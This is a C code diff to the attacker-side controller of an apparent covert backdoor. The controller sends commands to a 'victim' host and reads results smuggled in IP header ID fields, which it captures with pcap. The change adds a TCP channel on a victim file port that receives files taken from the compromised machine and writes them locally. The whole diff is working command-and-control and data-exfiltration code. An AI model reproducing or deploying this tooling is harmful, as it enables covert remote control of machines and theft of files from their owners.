@@ -22,6 +22,7 @@ int main(void) {
 
     create_socket(&opts, 'A', 'U', opts.dest_ip, VIC_UDP_PORT);
     create_socket(&opts, 'A', 'T', opts.dest_ip, VIC_TCP_PORT);
+    create_socket(&opts, 'A', 'R', opts.dest_ip, VIC_FILE_PORT);
 
     if (pthread_create(&command_thread, NULL, input_select_call, (void*)&opts) != 0) {
         perror("udp thread create error");
@@ -103,7 +104,7 @@ void get_my_ip(char *nic_interface, struct options_attacker *opts) {
 
 void* input_select_call(void* arg) {
     struct options_attacker *opts = (struct options_attacker*)arg;
-    char instruction[64] = {0}, s_buffer[UDP_SEND_SIZE] = {0};
+    char instruction[64] = {0}, s_buffer[UDP_SEND_SIZE] = {0}, r_buffer[5000] = {0};
     int byte;
 
     fd_set reads, cpy_reads;
@@ -120,8 +121,9 @@ void* input_select_call(void* arg) {
 
     FD_ZERO(&reads);
     FD_SET(STDIN_FILENO, &reads);
+    FD_SET(opts->rtcp_socket, &reads);
 
-    fd_max = STDIN_FILENO;
+    fd_max = opts->rtcp_socket;
 
     while (1) {
         cpy_reads = reads;
@@ -137,8 +139,9 @@ void* input_select_call(void* arg) {
                     puts("============ RESULT ============");
                     if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                         opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
-                        if (strstr(opts->victim_instruction, "target") != NULL )
+                        if (strstr(opts->victim_instruction, "target") != NULL ) {
                             strcpy(opts->target_directory, opts->victim_instruction + 7);
+                        }
 
                         sprintf(instruction, "[[%s]]", opts->victim_instruction);
                         length = strlen(instruction);
@@ -156,6 +159,27 @@ void* input_select_call(void* arg) {
                         }
                         memset(instruction, 0, 64);
                     }
+                }
+                if (i == opts->rtcp_socket) {
+                    int bytes = (int)read(opts->rtcp_socket, r_buffer, sizeof(r_buffer));
+
+                    if (opts->file_flag == TRUE) {
+
+                        memcpy(opts->data + opts->size, r_buffer, (unsigned long) bytes);
+                        opts->size += bytes;
+                        if (opts->size >= opts->file_size) {
+                            create_file(opts);
+                        }
+                    }
+
+                    if (opts->file_flag == FALSE) {
+                        tokenize_file_info(opts, r_buffer);
+                        setvbuf(stdout, NULL, _IONBF, 0);
+                        setvbuf(stderr, NULL, _IONBF, 0);
+                        opts->file_flag = TRUE;
+                        bytes = 0;
+                    }
+                    memset(r_buffer, 0, sizeof(r_buffer));
                 }
             }
         }
@@ -179,46 +203,21 @@ void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
 void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     struct ether_header* ether;
     struct iphdr *ip;
-    struct udphdr *udp;
-    char temp[2] = {0};
     char c;
-    int s = 0;
-
-    struct options_attacker *opts = (struct options_attacker*)args;
 
     ether = (struct ether_header*)(packet);
     ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
-    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));
     c = (char)hide_data(ntohs(ip->id));
 
-    if (udp->uh_dport == ntohs(15000)) {
-        if (opts->file_flag == FALSE) {
-            temp[0] = c;
-            temp[1] = '\0';
-            strcat(opts->file_info, temp);
-            if (strstr(opts->file_info, "]end") != NULL) {
-                opts->file_flag = TRUE;
-                tokenize_file_info(opts);
-            }
-        }
-        if (opts->file_flag == TRUE) {
-            create_file(opts, c);
-            s++;
-            if (s == opts->file_size) {
-                printf("Successfully download file");
-            }
-        }
-    }
-    else {
-        setvbuf(stdout, NULL, _IONBF, 0);
-        setvbuf(stderr, NULL, _IONBF, 0);
-        printf("%c", c);
-    }
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    printf("%c", c);
+
 }
 
 
-void tokenize_file_info(struct options_attacker *opts) {
-    char *start = strchr(opts->file_info, '[');
+void tokenize_file_info(struct options_attacker *opts, char* buffer) {
+    char *start = strchr(buffer, '[');
     char *file_name;
     char *token;
     if (start != NULL) {
@@ -228,23 +227,27 @@ void tokenize_file_info(struct options_attacker *opts) {
             token = strtok(NULL, " ");
             if (token != NULL && strcmp(token, "size:") == 0) {
                 // Extract size
-                token = strtok(NULL, "[");
+                token = strtok(NULL, "]end");
                 if(token != NULL) {
                     opts->file_size = atoi(token);
                 }
             }
         }
     }
+    opts->data = malloc(sizeof(char) * (unsigned long) opts->file_size);
 }
 
 
-void create_file(struct options_attacker *opts, char c) {
-    FILE *fp = fopen(opts->file_name, "ab");
-
+void create_file(struct options_attacker *opts) {
+    FILE *fp = fopen(opts->file_name, "wb");
     if(fp == NULL) {
         perror("create_file() - Failed to open file");
     }
-    // Write the hex value to the file
-    fwrite(&c, sizeof(char), 1, fp);
+
+    fwrite(opts->data, (unsigned long) opts->file_size, 1, fp);
+
+    free(opts->data);
+    opts->size = 0;
+    opts->file_flag = FALSE;
     fclose(fp);
 }
